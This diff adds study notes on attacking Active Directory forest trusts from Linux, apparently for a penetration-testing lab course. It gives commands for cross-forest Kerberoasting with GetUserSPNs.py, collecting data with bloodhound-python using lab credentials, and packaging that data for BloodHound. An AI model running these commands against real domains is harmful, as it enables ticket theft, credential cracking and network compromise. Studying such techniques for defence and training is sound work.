@@ -3158,3 +3158,58 @@ Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential
 5. **Access Verification** using WinRM.
 6. **SID History Abuse** across forest trust (if SID Filtering is not enabled).
 
+---
+
+# Attacking Domain Trusts - Cross-Forest Trust Abuse from Linux
+
+## Cross-Forest Kerberoasting
+Using **GetUserSPNs.py** from a Linux attack host to perform Kerberoasting across a forest trust.
+
+### Enumerate SPNs
+```shell
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+- Identify SPNs in the target domain.
+- Example output:
+  - **ServicePrincipalName**: MSSQLsvc/sql01.freightlogstics:1433
+  - **Name**: mssqlsvc
+  - **MemberOf**: CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+
+### Request TGS Ticket
+```shell
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+- Obtain TGS ticket for offline cracking.
+
+## Hunting Foreign Group Membership with Bloodhound-python
+### Setup DNS Configuration
+Edit `/etc/resolv.conf` to configure DNS for the target domain.
+
+```shell
+# Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+### Run Bloodhound-python
+Collect data from the target domain.
+
+```shell
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+```
+- Repeat for the FREIGHTLOGISTICS.LOCAL domain.
+
+```shell
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+```
+
+### Compress and Upload Data
+Compress collected data to upload into the BloodHound GUI.
+
+```shell
+zip -r ilfreight_bh.zip *.json
+```
+
+### Analyze in BloodHound
+- **Analysis**: Users with Foreign Domain Group Membership.
+- **Source Domain**: INLANEFREIGHT.LOCAL.
